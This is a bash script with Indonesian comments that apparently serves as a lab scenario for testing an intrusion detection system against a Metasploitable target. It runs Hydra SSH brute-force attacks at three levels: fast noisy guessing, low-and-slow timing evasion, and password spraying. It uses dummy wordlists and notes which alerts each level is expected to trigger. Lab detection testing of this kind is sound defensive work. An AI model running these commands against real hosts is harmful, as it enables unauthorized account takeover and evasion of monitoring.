#!/bin/bash

# =================================================================
# SKENARIO 02: BRUTE FORCE (HYDRA)
# Strategi: 3 Level Depth (Noisy, Low-Slow, Password Spraying)
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
TARGET_USER="msfadmin"      # User valid
# FIX: Menambahkan tanda kutip penutup yang hilang di baris bawah ini
LOG_FILE="logs/hydra_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# MEMBUAT WORDLIST DUMMY (Agar script bisa langsung jalan)
# Ini penting agar screenshot nanti valid (ada filenya)
echo "123456" > logs/pass_short.txt
echo "password" >> logs/pass_short.txt
echo "msfadmin" >> logs/pass_short.txt
echo "admin123" >> logs/pass_short.txt
echo "qwerty" >> logs/pass_short.txt

echo "root" > logs/user_list.txt
echo "admin" >> logs/user_list.txt
echo "support" >> logs/user_list.txt
echo "user" >> logs/user_list.txt
echo "msfadmin" >> logs/user_list.txt

echo "[+] [02_HYDRA] Memulai Skenario Brute Force SSH..."
echo "[+] Target: $TARGET_IP"
echo "[+] Waktu Mulai: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: NOISY ATTACK (Traditional Brute Force)
# Tujuan: Baseline. Harus terdeteksi sebagai "Potential SSH Brute Force".
# Teknik: Parallel tasks (-t 4), cepat, tanpa jeda.
# Pola: 1 User vs Banyak Password.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Fast Brute Force (-t 4)...${NC}"

# Simpan Command untuk Laporan
CMD="hydra -l $TARGET_USER -P logs/pass_short.txt ssh://$TARGET_IP -t 4 -V"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command (Output disimpan ke file log, error dibuang)
$CMD -o logs/hydra_lvl1.txt > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Alert ET SCAN SSH Brute Force)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: LOW & SLOW (Timing Evasion)
# Tujuan: Menguji "Threshold" time window di IDS.
# Teknik: Single task (-t 1) dengan jeda waktu (-w 5) antar percobaan.
#         Banyak IDS gagal mendeteksi ini karena dianggap user lambat.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running Low-Slow Attack (-t 1 -w 5)...${NC}"

# Simpan Command (Perhatikan flag -w 5)
CMD="hydra -l $TARGET_USER -P logs/pass_short.txt ssh://$TARGET_IP -t 1 -w 5"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD -o logs/hydra_lvl2.txt > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Mungkin False Negative / Tidak ada alert)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PASSWORD SPRAYING (Reverse Brute Force)
# Tujuan: Menghindari rule standar yang memantau "1 IP ke 1 User".
# Teknik: Mencoba 1 Password ke Banyak User.
# Pola: Banyak User vs 1 Password.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Password Spraying (Many Users, 1 Pass)...${NC}"

# Simpan Command (Perhatikan flag -L besar untuk user list)
CMD="hydra -L logs/user_list.txt -p password123 ssh://$TARGET_IP -t 4"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD -o logs/hydra_lvl3.txt > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Alert berbeda/spesifik Spraying)"

# BERSIH-BERSIH
rm logs/pass_short.txt logs/user_list.txt

echo "[+] [02_HYDRA] Skenario Selesai pada $(date)"
echo "-----------------------------------------------------------"